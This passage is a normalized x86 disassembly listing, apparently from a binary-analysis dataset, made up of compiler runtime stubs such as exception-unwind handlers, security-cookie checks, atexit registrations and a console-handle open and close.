cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_40d6e4
push 0x1
call sub_40b20d
pop ecx
retn
sub_40deb6
push ebx
call sub_412ce9
pop ecx
retn
sub_40df8f
push ebx
call sub_412ce9
pop ecx
retn
sub_40e375
push [ ebp + 0x8 ]
call sub_408f0c
pop ecx
retn
sub_40e4e4
push [ ebp + 0x8 ]
call sub_412ce9
pop ecx
retn
sub_40e646
push ebx
call sub_412ce9
pop ecx
retn
sub_40e650
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_412b30
sub_40e666
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_412b30
sub_411ba6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_411ad0
add esp 0xc
pop ebp
retn 0x4
sub_411bd9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_411d45
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_411c0b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_411ad0
add esp 0xc
pop ebp
retn 0x8
sub_411d19
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_411c50
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_411d64
call eax
retn
sub_411e7b
and [ rw-data ] 0x0
retn
sub_411e83
push 0x2
call sub_407852
sub_41224a
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_4121f7
add esp 0x10
pop ebp
retn
sub_412907
push ebx
call sub_412ce9
pop ecx
retn
sub_412abd
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4129a7
add esp 0x10
pop ebp
retn
sub_412b0f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_412ad7
pop ecx
pop ecx
pop ebp
retn
sub_412ce0
push 0xa
call sub_40b20d
pop ecx
retn
sub_412e50
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_41348b
add esp 0xc
pop ebp
retn
sub_413115
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
sub_413134
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_413570
mov eax r--data
jmp sub_406db4
sub_413580
mov eax r--data
jmp sub_406db4
sub_413590
mov ecx [ ebp - 0x10 ]
jmp sub_401160
sub_413598
mov eax r--data
jmp sub_406db4
sub_4135b0
lea ecx [ ebp - 0x28 ]
jmp sub_401160
sub_4135b8
lea ecx [ ebp - 0x28 ]
jmp sub_401f90
sub_4135c0
lea ecx [ ebp - 0x28 ]
jmp sub_401160
sub_4135c8
mov eax r--data
jmp sub_406db4
sub_4135e0
lea ecx [ ebp - 0x24 ]
jmp sub_401160
sub_4135e8
lea ecx [ ebp - 0x24 ]
jmp sub_401f90
sub_4135f0
lea ecx [ ebp - 0x24 ]
jmp sub_401160
sub_4135f8
mov eax r--data
jmp sub_406db4
sub_413610
mov eax r--data
jmp sub_406db4
sub_413620
lea ecx [ ebp - 0x20 ]
jmp sub_401160
sub_413628
lea ecx [ ebp - 0x20 ]
jmp sub_401f90
sub_413630
lea ecx [ ebp - 0x20 ]
jmp sub_401160
sub_413638
mov eax r--data
jmp sub_406db4
sub_413650
lea ecx [ ebp - 0x44 ]
jmp sub_4016b0
sub_413658
lea ecx [ ebp - 0x28 ]
jmp sub_4016b0
sub_413660
mov eax r--data
jmp sub_406db4
sub_413670
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0xb8 ]
jmp sub_4016b0
sub_41368c
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x80 ]
jmp sub_4016b0
sub_4136a5
mov eax [ ebp - 0x10 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffb
lea ecx [ ebp - 0x48 ]
jmp sub_4016b0
sub_4136be
mov eax [ ebp - 0x10 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffff7
lea ecx [ ebp - 0x2c ]
jmp sub_4016b0
sub_4136d7
mov eax [ ebp - 0x10 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x10 ] 0xffffffef
lea ecx [ ebp - 0x64 ]
jmp sub_4016b0
sub_4136f0
mov eax [ ebp - 0x10 ]
and eax 0x20
je r-xdata
retn
and [ ebp - 0x10 ] 0xffffffdf
lea ecx [ ebp - 0x9c ]
jmp sub_4016b0
sub_41370c
mov eax r--data
jmp sub_406db4
sub_413720
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_4010a0
add esp 0x8
retn
sub_413731
mov ecx [ ebp - 0x10 ]
jmp sub_4016b0
sub_413739
mov eax r--data
jmp sub_406db4
sub_413750
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_4016b0
sub_413769
mov eax r--data
jmp sub_406db4
sub_413780
mov eax r--data
jmp sub_406db4
sub_413790
mov ecx [ ebp - 0x10 ]
jmp sub_401510
sub_413798
mov eax r--data
jmp sub_406db4
sub_4137b0
lea ecx [ ebp - 0x54 ]
jmp sub_4016b0
sub_4137b8
lea ecx [ ebp - 0x38 ]
jmp sub_4016b0
sub_4137c0
lea ecx [ ebp - 0x220 ]
jmp sub_4016b0
sub_4137cb
lea ecx [ ebp - 0x220 ]
jmp sub_401840
sub_4137d6
lea ecx [ ebp - 0x78 ]
jmp sub_4016b0
sub_4137de
lea ecx [ ebp - 0x94 ]
jmp sub_4016b0
sub_4137e9
lea ecx [ ebp - 0x1e8 ]
jmp sub_4016b0
sub_4137f4
lea ecx [ ebp - 0x1e8 ]
jmp sub_401840
sub_4137ff
lea ecx [ ebp - 0x38 ]
jmp sub_4016b0
sub_413807
lea ecx [ ebp - 0x54 ]
jmp sub_4016b0
sub_41380f
lea ecx [ ebp - 0x178 ]
jmp sub_4016b0
sub_41381a
lea ecx [ ebp - 0x178 ]
jmp sub_401840
sub_413825
lea ecx [ ebp - 0x94 ]
jmp sub_4016b0
sub_413830
lea ecx [ ebp - 0x78 ]
jmp sub_4016b0
sub_413838
lea ecx [ ebp - 0x108 ]
jmp sub_4016b0
sub_413843
lea ecx [ ebp - 0x108 ]
jmp sub_401840
sub_41384e
lea ecx [ ebp - 0x38 ]
jmp sub_4016b0
sub_413856
lea ecx [ ebp - 0x54 ]
jmp sub_4016b0
sub_41385e
lea ecx [ ebp - 0x1b0 ]
jmp sub_4016b0
sub_413869
lea ecx [ ebp - 0x1b0 ]
jmp sub_401840
sub_413874
lea ecx [ ebp - 0x94 ]
jmp sub_4016b0
sub_41387f
lea ecx [ ebp - 0x78 ]
jmp sub_4016b0
sub_413887
lea ecx [ ebp - 0xd0 ]
jmp sub_4016b0
sub_413892
lea ecx [ ebp - 0xd0 ]
jmp sub_401840
sub_41389d
lea ecx [ ebp - 0x38 ]
jmp sub_4016b0
sub_4138a5
lea ecx [ ebp - 0x54 ]
jmp sub_4016b0
sub_4138ad
lea ecx [ ebp - 0x140 ]
jmp sub_4016b0
sub_4138b8
lea ecx [ ebp - 0x140 ]
jmp sub_401840
sub_4138c3
lea ecx [ ebp - 0x1c ]
jmp sub_403690
sub_4138cb
lea ecx [ ebp - 0x1c ]
jmp sub_401510
sub_4138d3
mov eax r--data
jmp sub_406db4
sub_4138e0
lea ecx [ ebp - 0x3c ]
jmp sub_4016b0
sub_4138e8
lea ecx [ ebp - 0x58 ]
jmp sub_4016b0
sub_4138f0
lea ecx [ ebp - 0x58 ]
jmp sub_4016b0
sub_4138f8
mov eax r--data
jmp sub_406db4
sub_413902
mov ecx [ ebp - 0x10 ]
jmp sub_405ccd
sub_41390a
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_404a44
sub_413915
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_404a44
sub_413920
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_404a44
sub_41392b
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_404a44
sub_413936
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413951
mov ecx [ ebp - 0x10 ]
jmp sub_405ccd
sub_413959
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_404a44
sub_413964
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_404a44
sub_41396f
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_404a44
sub_41397a
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_404a44
sub_413985
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_4139a0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4062c7
sub_4139ab
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_4139c6
push [ ebp + 0x8 ]
call sub_406807
pop ecx
retn
sub_4139d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_4139eb
lea ecx [ ebp - 0x10 ]
jmp sub_404769
sub_4139f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413a0e
lea ecx [ ebp - 0x14 ]
jmp sub_405ccd
sub_413a16
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413a31
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_404807
sub_413a4d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413a68
lea ecx [ ebp - 0x2c ]
jmp sub_4016b0
sub_413a70
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_407abb
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413a95
lea ecx [ ebp - 0x2c ]
jmp sub_4016b0
sub_413a9d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_407abb
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413ac2
mov ecx [ ebp - 0x10 ]
jmp sub_404a5b
sub_413aca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413ae5
mov ecx [ ebp - 0x10 ]
jmp sub_404746
sub_413aed
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_404a44
sub_413af8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413b13
lea ecx [ ebp - 0x10 ]
jmp sub_405ccd
sub_413b1b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413b36
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_407abb
mov eax r--data
jmp sub_406db4
sub_413b51
push sub_413c3e
call sub_407d41
pop ecx
retn
sub_413b5d
push sub_413c49
call sub_407d41
pop ecx
retn
sub_413b69
push sub_413c54
call sub_407d41
pop ecx
retn
sub_413b75
mov ecx rw-data
call sub_405c4b
push sub_413c5f
call sub_407d41
pop ecx
retn
sub_413bc5
push 0x1
push 0x0
push rw-data
mov ecx rw-data
call sub_4054a0
push sub_413c69
call sub_407d41
pop ecx
retn
sub_413be4
mov ecx rw-data
jmp sub_4049ef
sub_413bee
mov ecx rw-data
call sub_405c4b
push sub_413c7d
call sub_407d41
pop ecx
retn
sub_413c04
push sub_413c91
call sub_407d41
pop ecx
retn
sub_413c10
push sub_413c87
call sub_407d41
pop ecx
retn
sub_413c1c
mov ecx rw-data
call sub_405c4b
push sub_413c9b
call sub_407d41
pop ecx
retn
sub_413c32
push sub_413ca5
call sub_407d41
pop ecx
retn
sub_413c3e
mov [ rw-data ] r--data
retn
sub_413c49
mov [ rw-data ] r--data
retn
sub_413c54
mov [ rw-data ] r--data
retn
sub_413c5f
mov ecx rw-data
jmp sub_405c7c
sub_413c69
mov ecx rw-data
jmp sub_4049d0
sub_413c73
mov ecx rw-data
jmp sub_405a79
sub_413c7d
mov ecx rw-data
jmp sub_405c7c
sub_413c87
mov ecx rw-data
jmp sub_404769
sub_413c91
mov ecx rw-data
jmp sub_405e00
sub_413c9b
mov ecx rw-data
jmp sub_405c7c
sub_413ca5
mov ecx rw-data
jmp sub_406282
sub_413caf
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_406775
